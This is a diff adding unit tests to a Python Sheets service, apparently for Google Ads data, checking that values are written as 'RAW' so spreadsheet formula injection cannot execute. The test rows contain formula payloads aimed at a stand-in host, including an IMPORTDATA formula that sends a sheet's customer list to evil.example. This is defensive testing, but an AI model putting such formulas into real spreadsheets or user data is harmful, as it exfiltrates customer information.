@@ -14,10 +14,17 @@
 """Tests for Sheet Service."""
 
 from collections import namedtuple
+import types
 import unittest
 from unittest import mock
 import data_references
 from sheet_api import SheetsService
+
+_FAKE_CONFIG_YAML = (
+    'spreadsheet_id: "fake-spreadsheet-id"\n'
+    'customer_id_inclusion_list: ""\n'
+    'login_customer_id: "1234567890"\n'
+)
 
 
 class TestSheetService(unittest.TestCase):
@@ -27,9 +34,16 @@ class TestSheetService(unittest.TestCase):
     self.credentials = mock.Mock()
     self._google_ads_client = mock.Mock()
     self.google_ads_service = mock.MagicMock()
-    self.sheet_service = SheetsService(
-        self.credentials, self._google_ads_client, self.google_ads_service
-    )
+    with (
+        mock.patch(
+            "builtins.open", mock.mock_open(read_data=_FAKE_CONFIG_YAML)
+        ),
+        mock.patch("sheet_api.discovery.build") as mock_build,
+    ):
+      self.mock_spreadsheets = mock_build.return_value.spreadsheets.return_value
+      self.sheet_service = SheetsService(
+          self.credentials, self._google_ads_client, self.google_ads_service
+      )
 
   @mock.patch("sheet_api.SheetsService.update_asset_sheet_output")
   @mock.patch("sheet_api.SheetsService.update_sheet_lists")
@@ -208,3 +222,90 @@ class TestSheetService(unittest.TestCase):
             account_map,
         ),
     ])
+
+  def test_add_new_asset_group_to_list_sheet_uses_raw_input_option(self):
+    row = ["=Customer", "123", '=IMPORTDATA("https://evil.example")', "456", "+AG", "789"]
+    self.sheet_service.add_new_asset_group_to_list_sheet(row)
+    self.mock_spreadsheets.values.return_value.append.assert_called_once_with(
+        spreadsheetId="fake-spreadsheet-id",
+        range=f"{data_references.SheetNames.asset_groups}!{data_references.SheetRanges.asset_groups}",
+        body={"majorDimension": "ROWS", "values": [row]},
+        valueInputOption="RAW",
+    )
+
+  def test_add_new_campaign_to_list_sheet_uses_raw_input_option(self):
+    row = ["AcmeCorp", "123", '=IMPORTDATA("https://evil.example")', "456"]
+    self.sheet_service.add_new_campaign_to_list_sheet(row)
+    self.mock_spreadsheets.values.return_value.append.assert_called_once_with(
+        spreadsheetId="fake-spreadsheet-id",
+        range="CampaignList!A:D",
+        body={"majorDimension": "ROWS", "values": [row]},
+        valueInputOption="RAW",
+    )
+
+  def test_update_asset_sheet_output_uses_raw_input_option(self):
+    self.mock_spreadsheets.values.return_value.get.return_value.execute.return_value = {"values": []}
+    self.mock_spreadsheets.values.return_value.append.return_value.execute.return_value = {"tableRange": "", "updates": {}}
+    row = types.SimpleNamespace(
+        asset_group_asset=types.SimpleNamespace(
+            resource_name="customers/1/assetGroupAssets/2",
+            field_type=types.SimpleNamespace(name=data_references.AssetTypes.headline),
+        ),
+        asset_group=types.SimpleNamespace(name="+AssetGroup"),
+        customer=types.SimpleNamespace(descriptive_name="@Acme"),
+        campaign=types.SimpleNamespace(name="=Campaign"),
+        asset=types.SimpleNamespace(text_asset=types.SimpleNamespace(text='=IMPORTDATA("https://evil.example")')),
+    )
+    self.sheet_service.update_asset_sheet_output([row], {"@Acme": {"=Campaign": ["+AssetGroup"]}})
+    _, kwargs = self.mock_spreadsheets.values.return_value.append.call_args
+    self.assertEqual(kwargs["valueInputOption"], "RAW")
+
+  def test_update_sitelink_sheet_output_uses_raw_input_option(self):
+    self.mock_spreadsheets.values.return_value.get.return_value.execute.return_value = {"values": []}
+    self.mock_spreadsheets.values.return_value.append.return_value.execute.return_value = {"tableRange": "", "updates": {}}
+    row = types.SimpleNamespace(
+        campaign_asset=types.SimpleNamespace(resource_name="customers/1/campaignAssets/2"),
+        customer=types.SimpleNamespace(descriptive_name="Acme"),
+        campaign=types.SimpleNamespace(name="Camp1"),
+        asset=types.SimpleNamespace(
+            final_urls=["https://example.com"],
+            sitelink_asset=types.SimpleNamespace(
+                link_text='=HYPERLINK("https://evil.example","Click")',
+                description1="-desc1",
+                description2="+desc2",
+            ),
+        ),
+    )
+    self.sheet_service.update_sitelink_sheet_output([row], {"Acme": {"Camp1": []}})
+    _, kwargs = self.mock_spreadsheets.values.return_value.append.call_args
+    self.assertEqual(kwargs["valueInputOption"], "RAW")
+
+  def test_update_sheet_lists_uses_raw_input_option_for_formula_payloads(self):
+    payload = '=IMPORTDATA("https://evil.example/exfil?"&JOIN(",",CustomerList!A:B))'
+    row = types.SimpleNamespace(
+        campaign=types.SimpleNamespace(name=payload, id=7777777777),
+        customer=types.SimpleNamespace(descriptive_name="AcmeCorp", id=1234567890),
+    )
+    self.sheet_service.update_sheet_lists(
+        results=[row],
+        sheet_name=data_references.SheetNames.campaigns,
+        column="!D:D",
+        account_map={"AcmeCorp": {}},
+        existing_values_set=set(),
+    )
+    _, kwargs = self.mock_spreadsheets.values.return_value.append.call_args
+    self.assertEqual(kwargs["valueInputOption"], "RAW")
+    self.assertEqual(kwargs["body"]["values"][0][data_references.CampaignList.campaign_name], payload)
+
+  def test_set_cell_value_preserves_user_entered_for_trusted_formulas(self):
+    formula = "=SORT(UNIQUE({CustomerList!$A$5:$A}))"
+    self.sheet_service._set_cell_value(formula, "DropDownConfig!N3")
+    self.mock_spreadsheets.values.return_value.update.assert_called_once_with(
+        spreadsheetId="fake-spreadsheet-id",
+        valueInputOption="USER_ENTERED",
+        range="DropDownConfig!N3",
+        body={"range": "DropDownConfig!N3", "values": [[formula]]},
+    )
+
+if __name__ == "__main__":
+  unittest.main()
